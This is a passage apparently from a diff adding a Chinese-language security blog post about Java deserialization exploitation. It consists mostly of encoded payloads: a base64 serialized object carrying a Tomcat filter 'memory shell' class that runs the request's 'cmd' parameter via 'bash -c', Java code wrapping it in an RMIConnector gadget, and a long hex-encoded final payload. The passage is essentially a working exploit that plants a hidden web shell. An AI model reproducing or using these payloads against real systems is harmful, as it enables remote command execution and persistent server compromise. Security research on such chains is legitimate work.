hbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwD3AQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAg8Y2xpbml0PgEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAARuYW1lAQAKVVJMUGF0dGVybgEAFXdlYmFwcENsYXNzTG9hZGVyQmFzZQEAMkxvcmcvYXBhY2hlL2NhdGFsaW5hL2xvYWRlci9XZWJhcHBDbGFzc0xvYWRlckJhc2U7AQAPc3RhbmRhcmRDb250ZXh0AQAqTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29yZS9TdGFuZGFyZENvbnRleHQ7AQAGYUNsYXNzAQARTGphdmEvbGFuZy9DbGFzczsBAAdDb25maWdzAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEADWZpbHRlckNvbmZpZ3MBAA9MamF2YS91dGlsL01hcDsBAA5iZWhpbmRlckZpbHRlcgEACWZpbHRlckRlZgEAMUxvcmcvYXBhY2hlL3RvbWNhdC91dGlsL2Rlc2NyaXB0b3Ivd2ViL0ZpbHRlckRlZjsBAAlmaWx0ZXJNYXABADFMb3JnL2FwYWNoZS90b21jYXQvdXRpbC9kZXNjcmlwdG9yL3dlYi9GaWx0ZXJNYXA7AQALY29uc3RydWN0b3IBAB9MamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I7AQAyTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29yZS9BcHBsaWNhdGlvbkZpbHRlckNvbmZpZzsBABZMb2NhbFZhcmlhYmxlVHlwZVRhYmxlAQA+TGphdmEvbGFuZy9DbGFzczwrTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29yZS9TdGFuZGFyZENvbnRleHQ7PjsHAMwHANAHAOgHANQBAApTb3VyY2VGaWxlAQAjVG9tY2F0RmlsdGVyTWVtU2hlbGxGcm9tVGhyZWFkLmphdmEMAE0ATgEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBAAFjDAD4APkBABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIBABBqYXZhL2xhbmcvU3RyaW5nAQAEYmFzaAEAAi1jAQADY21kDABNAPoMAPsA/AEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyBwD1DAD9AP4MAE0A/wwATQEAAQAWamF2YS9sYW5nL1N0cmluZ0J1ZmZlcgwBAQECAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAQMBBAEADmxpbmUuc2VwYXJhdG9yBwEFDAEGAPkMAQcBAgwBAwEIBwDzDAEJAQoMAE0BCwcBDAwBDQEODAB3AE4HAPQMAFoBDwEAD015RmlsdGVyVmVyc2lvbgwBEAERDAEDARIBAAIvKgcBEwwBFAEVDAEWARcBADBvcmcvYXBhY2hlL2NhdGFsaW5hL2xvYWRlci9XZWJhcHBDbGFzc0xvYWRlckJhc2UMARgBGQcBGgwBGwEcAQAob3JnL2FwYWNoZS9jYXRhbGluYS9jb3JlL1N0YW5kYXJkQ29udGV4dAwBHQEeDAEfAR4MASABIQEAE2phdmEvbGFuZy9FeGNlcHRpb24HASIMASMBJAwBJQEmAQANamF2YS91dGlsL01hcAEAJlNoaXJvQ0IvVG9tY2F0RmlsdGVyTWVtU2hlbGxGcm9tVGhyZWFkAQAvb3JnL2FwYWNoZS90b21jYXQvdXRpbC9kZXNjcmlwdG9yL3dlYi9GaWx0ZXJEZWYMAScBKAwBKQEODAEqAQIMASsBDgwBLAEtAQAvb3JnL2FwYWNoZS90b21jYXQvdXRpbC9kZXNjcmlwdG9yL3dlYi9GaWx0ZXJNYXAMAS4BDgcBLwwBMAExDACHAQIMATIBDgwBMwE0AQAwb3JnL2FwYWNoZS9jYXRhbGluYS9jb3JlL0FwcGxpY2F0aW9uRmlsdGVyQ29uZmlnAQAPamF2YS9sYW5nL0NsYXNzAQAbb3JnL2FwYWNoZS9jYXRhbGluYS9Db250ZXh0DAE1ATYHATcBABBqYXZhL2xhbmcvT2JqZWN0DAE4ATkMAToBOwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABRqYXZheC9zZXJ2bGV0L0ZpbHRlcgEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQEAGWphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW4BABFqYXZhL2xhbmcvUHJvY2VzcwEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEACHRvU3RyaW5nAQAsKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAGyhMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjspVgEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAV3cml0ZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAQChMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7KVYBAAhuYW5vVGltZQEAAygpSgEAHChKKUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBABBqYXZhL2xhbmcvVGhyZWFkAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEADGdldFJlc291cmNlcwEAJygpTG9yZy9hcGFjaGUvY2F0YWxpbmEvV2ViUmVzb3VyY2VSb290OwEAI29yZy9hcGFjaGUvY2F0YWxpbmEvV2ViUmVzb3VyY2VSb290AQAKZ2V0Q29udGV4dAEAHygpTG9yZy9hcGFjaGUvY2F0YWxpbmEvQ29udGV4dDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAA1nZXRTdXBlcmNsYXNzAQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEACXNldEZpbHRlcgEAGShMamF2YXgvc2VydmxldC9GaWx0ZXI7KVYBAA1zZXRGaWx0ZXJOYW1lAQAHZ2V0TmFtZQEADnNldEZpbHRlckNsYXNzAQAMYWRkRmlsdGVyRGVmAQA0KExvcmcvYXBhY2hlL3RvbWNhdC91dGlsL2Rlc2NyaXB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&quot;);
+        RMIConnector rmiConnector = new RMIConnector(jmxServiceURL,new HashMap());
+        return rmiConnector;
+    }
+}
+</code></pre>
+<p>运行得到最终payload</p>
+<pre><code class="language-hex">aced0005770a0004534a545500000768737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c77080000001000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870737200286a617661782e6d616e6167656d656e742e72656d6f74652e726d692e524d49436f6e6e6563746f720b57b6f88224e2e90300024c000d6a6d785365727669636555524c7400274c6a617661782f6d616e6167656d656e742f72656d6f74652f4a4d585365727669636555524c3b4c0009726d695365727665727400274c6a617661782f6d616e6167656d656e742f72656d6f74652f726d692f524d495365727665723b7870737200256a617661782e6d616e6167656d656e742e72656d6f74652e4a4d585365727669636555524c716d9fa05d926d1c020004490004706f72744c0004686f73747400124c6a6176612f6c616e672f537472696e673b4c000870726f746f636f6c71007e000b4c000775726c5061746871007e000b78700000000074000074000469696f7074293e2f737475622f724f304142584e794142467159585a684c6e5630615777755347467a614531686341554832734844466d4452417741435267414b624739685a455a6859335276636b6b414358526f636d567a614739735a486877503041414141414141417833434141414142414141414142633349414e4739795a7935686347466a6147557559323974625739756379356a623278735a574e3061573975637935725a586c32595778315a5335556157566b5457467752573530636e6d4b72644b624f63456632774941416b77414132746c65585141456b787159585a684c327868626d637654324a715a574e304f30774141323168634851414430787159585a684c33563061577776545746774f3368776441414459574668633349414b6d39795a7935686347466a6147557559323974625739756379356a623278735a574e3061573975637935745958417554474636655531686347376c6c494b656552435541774142544141485a6d466a64473979655851414c457876636d6376595842685932686c4c324e7662573176626e4d76593239736247566a64476c76626e4d7656484a68626e4e6d62334a745a5849376548427a6367413662334a6e4c6d467759574e6f5a53356a623231746232357a4c6d4e766247786c593352706232357a4c6d5a31626d4e3062334a7a4c6b4e6f59576c755a575255636d467563325a76636d316c636a44486c2b776f65706345416741425777414e615652795957357a5a6d397962575679633351414c56744d62334a6e4c32467759574e6f5a53396a623231746232357a4c324e766247786c593352706232357a4c3152795957357a5a6d3979625756794f336877645849414c56744d62334a6e4c6d467759574e6f5a53356a623231746232357a4c6d4e766247786c593352706232357a4c6c52795957357a5a6d3979625756794f3731574b7648594e42695a416741416548414141414143633349414f3239795a7935686347466a6147557559323974625739756379356a623278735a574e30615739756379356d6457356a64473979637935446232357a64474675644652795957357a5a6d3979625756795748615145554543735a51434141464d41416c705132397563335268626e52784148344141336877646e49414e324e766253357a6457347562334a6e4c6d467759574e6f5a5335345957786862693570626e526c636d3568624335346332783059793530636d46344c6c527951566847615778305a5849414141414141414141414141414148687763334941506d39795a7935686347466a6147557559323974625739756379356a623278735a574e30615739756379356d6457356a644739796379354a626e4e3059573530615746305a5652795957357a5a6d3979625756794e497630663653473044734341414a624141567051584a6e633351414531744d616d4632595339735957356e4c303969616d566a644474624141747055474679595731556558426c63335141456c744d616d4632595339735957356e4c304e7359584e7a4f336877645849414531744d616d4632595335735957356e4c6b3969616d566a644475517a6c696645484d7062414941414868774141414141584e794144706a62323075633356754c6d39795a7935686347466a614755756547467359573475615735305a584a755957777565484e7364474d7564484a68654335555a573177624746305a584e4a625842734356645077573673717a4d4441415a4a414131666157356b5a573530546e5674596d56795351414f583352795957357a624756305357356b5a58686241417066596e6c305a574e765a47567a64414144573174435777414758324e7359584e7a6351422b4142564d41415666626d46745a585141456b787159585a684c327868626d6376553352796157356e4f307741455639766458527764585251636d39775a584a306157567a6441415754477068646d45766458527062433951636d39775a584a306157567a4f3368774141414141502f2f2f2f39316367414457317443532f305a4657646e327a63434141423463414141414146316367414357304b73387866344267685534414941414868774141415a374d722b75723441414141304154774b414573416f77634170416741705173414167436d4277436e4277436f43414370434143714341437243674146414b774b41415541725163417267634172776f41734143784367414e414c494b414177417377634174416f414551436a4367414d414c5548414c594b414251416f776f41464143334341433443674335414c6f4b4142514175776f414551433843774339414c344b4141594176776f417741444243674377414d494c414d4d417841674178516f417551444743674155414d6349414d674b414d6b4179676f417951444c4277444d4367416d414d304c414d34417a77634130416f415341445243674245414e4949414a454b414551413077634131416f413151445743674456414e6348414e6748414e6b4b414449416f77634132676f414e41436a43674130414e734b4144514133416f415241446443674130414e344b41436b413377634134416f414f77436a43674137414f454b4144734133416b413467446a43674469414f514b4144734135516f414b51446d4277446e4277446f4277447043674245414f6f4b414f73413167634137416f413677447443774178414f3448414f38484150414241415938615735706444344241414d6f4b565942414152446232526c4151415054476c755a55353162574a6c636c5268596d786c415141535447396a5957785759584a7059574a735a565268596d786c4151414564476870637745414b45785461476c7962304e434c31527662574e6864455a706248526c636b316c62564e6f5a577873526e4a766256526f636d56685a44734241415270626d6c30415141664b45787159585a686543397a5a584a32624756304c305a706248526c636b4e76626d5a705a7a73705667454144475a706248526c636b4e76626d5a705a7745414845787159585a686543397a5a584a32624756304c305a706248526c636b4e76626d5a705a7a73424141704665474e6c634852706232357a42774478415141495a473947615778305a5849424146736f54477068646d46344c334e6c636e5a735a58517655325679646d786c64464a6c6358566c6333513754477068646d46344c334e6c636e5a735a58517655325679646d786c64464a6c63334276626e4e6c4f30787159585a686543397a5a584a32624756304c305a706248526c636b4e6f59576c754f796c574151414863484a765932567a637745414530787159585a684c327868626d637655484a765932567a637a734241414a69636745414745787159585a684c326c764c304a315a6d5a6c636d566b556d56685a4756794f77454142477870626d554241424a4d616d4632595339735957356e4c314e30636d6c755a7a734241414a7a596745414745787159585a684c327868626d6376553352796157356e516e566d5a6d56794f774541446e4e6c636e5a735a5852535a5846315a584e304151416554477068646d46344c334e6c636e5a735a58517655325679646d786c64464a6c6358566c633351374151415063325679646d786c64464a6c63334276626e4e6c4151416654477068646d46344c334e6c636e5a735a58517655325679646d786c64464a6c63334276626e4e6c4f77454143325a706248526c636b4e6f59576c754151416254477068646d46344c334e6c636e5a735a585176526d6c7364475679513268686157343741514144636d56784151416e54477068646d46344c334e6c636e5a735a58517661485230634339496448527755325679646d786c64464a6c6358566c633351374151414e553352685932744e5958425559574a735a516341325163413867634138776341394163417041634139516341726763417141634174416341396745414232526c6333527962336b4241416c30636d467563325a76636d30424148496f54474e766253397a6457347662334a6e4c32467759574e6f5a5339345957786862693970626e526c636d3568624339346332783059793945543030375730786a62323076633356754c3239795a7939686347466a61475576654731734c326c7564475679626d46734c334e6c636d6c6862476c365a58497655325679615746736158706864476c76626b6868626d52735a5849374b5659424141686b62324e3162575675644145414c55786a62323076633356754c3239795a7939686347466a614755766547467359573476615735305a584a755957777665484e7364474d765245394e4f77454143476868626d52735a584a7a415142435730786a62323076633356754c3239795a7939686347466a61475576654731734c326c7564475679626d46734c334e6c636d6c6862476c365a58497655325679615746736158706864476c76626b6868626d52735a584937427744334151436d4b45786a62323076633356754c3239795a7939686347466a614755766547467359573476615735305a584a755957777665484e7364474d765245394e4f30786a62323076633356754c3239795a7939686347466a61475576654731734c326c7564475679626d46734c325230625339455645314265476c7a5358526c636d46306233493754474e766253397a6457347662334a6e4c32467759574e6f5a53393462577776615735305a584a755957777663325679615746736158706c636939545a584a7059577870656d463061573975534746755a47786c636a73705667454143476c305a584a68644739794151413154474e766253397a6457347662334a6e4c32467759574e6f5a53393462577776615735305a584a75595777765a4852744c3052555455463461584e4a6447567959585276636a73424141646f5957356b624756794151424254474e766253397a6457347662334a6e4c32467759574e6f5a53393462577776615735305a584a755957777663325679615746736158706c636939545a584a7059577870656d463061573975534746755a47786c636a73424141673859327870626d6c3050674541415755424142564d616d4632595339735957356e4c3056345932567764476c76626a7342414152755957316c4151414b56564a4d5547463064475679626745414658646c596d467763454e7359584e7a544739685a475679516d467a5a5145414d6b7876636d6376595842685932686c4c324e6864474673615735684c3278765957526c636939585a574a68634842446247467a633078765957526c636b4a68633255374151415063335268626d5268636d5244623235305a58683041514171544739795a7939686347466a614755765932463059577870626d4576593239795a533954644746755a4746795a454e76626e526c654851374151414759554e7359584e7a4151415254477068646d4576624746755a7939446247467a637a7342414164446232356d6157647a4151415a54477068646d4576624746755a7939795a575a735a574e304c305a705a57786b4f77454144575a706248526c636b4e76626d5a705a334d424141394d616d46325953393164476c734c30316863447342414135695a576870626d526c636b5a706248526c6367454143575a706248526c636b526c5a6745414d557876636d6376595842685932686c4c33527662574e686443393164476c734c32526c63324e796158423062334976643256694c305a706248526c636b526c5a6a734241416c6d615778305a584a4e595841424144464d62334a6e4c32467759574e6f5a5339306232316a59585176645852706243396b5a584e6a636d6c77644739794c33646c59693947615778305a584a4e595841374151414c593239756333527964574e30623349424142394d616d4632595339735957356e4c334a6c5a6d786c59335176513239756333527964574e306233493741514179544739795a7939686347466a614755765932463059577870626d4576593239795a5339426348427361574e6864476c76626b5a706248526c636b4e76626d5a705a7a734241425a4d62324e6862465a68636d6c68596d786c56486c775a565268596d786c4151412b54477068646d4576624746755a7939446247467a637a7772544739795a7939686347466a614755765932463059577870626d4576593239795a533954644746755a4746795a454e76626e526c65485137506a7348414d7748414e4148414f6748414e51424141705462335679593256476157786c4151416a5647397459324630526d6c7364475679545756745532686c62477847636d3974564768795a57466b4c6d7068646d454d41453041546745414a577068646d46344c334e6c636e5a735a58517661485230634339496448527755325679646d786c64464a6c6358566c633351424141466a4441443441506b424142687159585a684c327868626d637655484a765932567a63304a316157786b5a5849424142427159585a684c327868626d6376553352796157356e41514145596d467a614145414169316a415141445932316b4441424e41506f4d415073412f414541466d7068646d457661573876516e566d5a6d56795a5752535a57466b5a58494241426c7159585a684c326c764c306c7563485630553352795a574674556d56685a47567942774431444144394150344d414530412f7777415451454141514157616d4632595339735957356e4c314e30636d6c755a304a315a6d5a6c636777424151454341514158616d4632595339735957356e4c314e30636d6c755a304a316157786b5a58494d41514d4242414541446d7870626d55756332567759584a6864473979427745464441454741506b4d4151634241677742417745494277447a4441454a41516f4d4145304243776342444177424451454f44414233414534484150514d41466f424477454144303135526d6c7364475679566d567963326c7662677742454145524441454441524942414149764b6763424577774246414556444145574152634241444276636d6376595842685932686c4c324e6864474673615735684c3278765957526c636939585a574a68634842446247467a633078765957526c636b4a686332554d415267424751634247677742477745634151416f62334a6e4c32467759574e6f5a53396a5958526862476c755953396a62334a6c4c314e305957356b59584a6b51323975644756346441774248514565444145664152344d415341424951454145327068646d4576624746755a79394665474e6c63485270623234484153494d41534d424a4177424a51456d4151414e616d46325953393164476c734c303168634145414a6c4e6f61584a76513049765647397459324630526d6c7364475679545756745532686c62477847636d3974564768795a57466b4151417662334a6e4c32467759574e6f5a5339306232316a59585176645852706243396b5a584e6a636d6c77644739794c33646c59693947615778305a584a455a57594d415363424b4177424b51454f444145714151494d41537342446777424c4145744151417662334a6e4c32467759574e6f5a5339306232316a59585176645852706243396b5a584e6a636d6c77644739794c33646c59693947615778305a584a4e5958414d41533442446763424c7777424d414578444143484151494d41544942446777424d7745304151417762334a6e4c32467759574e6f5a53396a5958526862476c755953396a62334a6c4c304677634778705932463061573975526d6c7364475679513239755a6d6c6e41514150616d4632595339735957356e4c304e7359584e7a4151416262334a6e4c32467759574e6f5a53396a5958526862476c7559533944623235305a5868304441453141545948415463424142427159585a684c327868626d637654324a715a574e304441453441546b4d41546f424f77454151474e766253397a6457347662334a6e4c32467759574e6f5a5339345957786862693970626e526c636d3568624339346332783059793979645735306157316c4c3046696333527959574e3056484a68626e4e735a5851424142527159585a686543397a5a584a32624756304c305a706248526c63674541486d7068646d46344c334e6c636e5a735a58517655325679646d786c644556345932567764476c766267454148477068646d46344c334e6c636e5a735a58517655325679646d786c64464a6c6358566c633351424142317159585a686543397a5a584a32624756304c314e6c636e5a735a5852535a584e776232357a5a51454147577068646d46344c334e6c636e5a735a585176526d6c736447567951326868615734424142467159585a684c327868626d637655484a765932567a6377454145327068646d4576615738765355394665474e6c634852706232344241446c6a62323076633356754c3239795a7939686347466a614755766547467359573476615735305a584a755957777665484e7364474d7656484a68626e4e735a58524665474e6c63485270623234424141786e5a58525159584a68625756305a5849424143596f54477068646d4576624746755a79395464484a70626d63374b55787159585a684c327868626d6376553352796157356e4f7745414669686254477068646d4576624746755a79395464484a70626d63374b5659424141567a64474679644145414653677054477068646d4576624746755a793951636d396a5a584e7a4f774541446d646c64456c7563485630553352795a574674415141584b436c4d616d4632595339706279394a626e423164464e30636d5668625473424142676f54477068646d457661573876535735776458525464484a6c595730374b56594241424d6f54477068646d457661573876556d56685a4756794f796c5741514149636d56685a457870626d55424142516f4b55787159585a684c327868626d6376553352796157356e4f774541426d4677634756755a4145414c53684d616d4632595339735957356e4c314e30636d6c755a7a737054477068646d4576624746755a79395464484a70626d644364576c735a4756794f77454145477068646d4576624746755a79395465584e305a5730424141746e5a585251636d39775a584a306551454143485276553352796157356e415141734b45787159585a684c327868626d6376553352796157356e4f796c4d616d4632595339735957356e4c314e30636d6c755a304a315a6d5a6c636a734241416c6e5a585258636d6c305a5849424142636f4b55787159585a684c326c764c3142796157353056334a70644756794f7745414779684d616d4632595339735957356e4c314e30636d6c755a304a315a6d5a6c636a73705667454145327068646d45766157387655484a70626e5258636d6c305a58494241415633636d6c305a5145414653684d616d4632595339735957356e4c314e30636d6c755a7a7370566745415143684d616d46325958677663325679646d786c644339545a584a3262475630556d56786457567a6444744d616d46325958677663325679646d786c644339545a584a3262475630556d567a63473975633255374b565942414168755957357656476c745a51454141796770536745414843684b4b55787159585a684c327868626d6376553352796157356e516e56706247526c636a73424142427159585a684c327868626d6376564768795a57466b4151414e59335679636d56756446526f636d56685a4145414643677054477068646d4576624746755a79395561484a6c59575137415141565a325630513239756447563464454e7359584e7a544739685a4756794151415a4b436c4d616d4632595339735957356e4c304e7359584e7a544739685a4756794f7745414447646c64464a6c63323931636d4e6c637745414a796770544739795a7939686347466a614755765932463059577870626d457656325669556d567a6233567959325653623239304f774541493239795a7939686347466a614755765932463059577870626d457656325669556d567a6233567959325653623239304151414b5a32563051323975644756346441454148796770544739795a7939686347466a614755765932463059577870626d45765132397564475634644473424141686e5a5852446247467a637745414579677054477068646d4576624746755a7939446247467a637a73424141316e5a5852546458426c636d4e7359584e7a415141515a3256305247566a624746795a575247615756735a4145414c53684d616d4632595339735957356e4c314e30636d6c755a7a737054477068646d4576624746755a7939795a575a735a574e304c305a705a57786b4f77454146327068646d4576624746755a7939795a575a735a574e304c305a705a57786b4151414e6332563051574e6a5a584e7a61574a735a514541424368614b56594241414e6e5a5851424143596f54477068646d4576624746755a793950596d706c593351374b55787159585a684c327868626d637654324a715a574e304f77454143584e6c64455a706248526c636745414753684d616d46325958677663325679646d786c64433947615778305a5849374b5659424141317a5a585247615778305a584a4f5957316c415141485a325630546d46745a514541446e4e6c64455a706248526c636b4e7359584e7a4151414d5957526b526d6c73644756795247566d415141304b457876636d6376595842685932686c4c33527662574e686443393164476c734c32526c63324e796158423062334976643256694c305a706248526c636b526c5a6a7370566745414457466b5a465653544642686448526c636d34424142787159585a686543397a5a584a32624756304c3052706333426864474e6f5a584a556558426c41514148556b56525655565456414541486b787159585a686543397a5a584a32624756304c3052706333426864474e6f5a584a556558426c4f77454144584e6c644552706333426864474e6f5a58494241424a685a475247615778305a584a4e595842435a575a76636d55424144516f544739795a7939686347466a6147557664473974593246304c335630615777765a47567a59334a7063485276636939335a574976526d6c7364475679545746774f796c57415141575a3256305247566a624746795a5752446232357a64484a3159335276636745414d79686254477068646d4576624746755a7939446247467a637a737054477068646d4576624746755a7939795a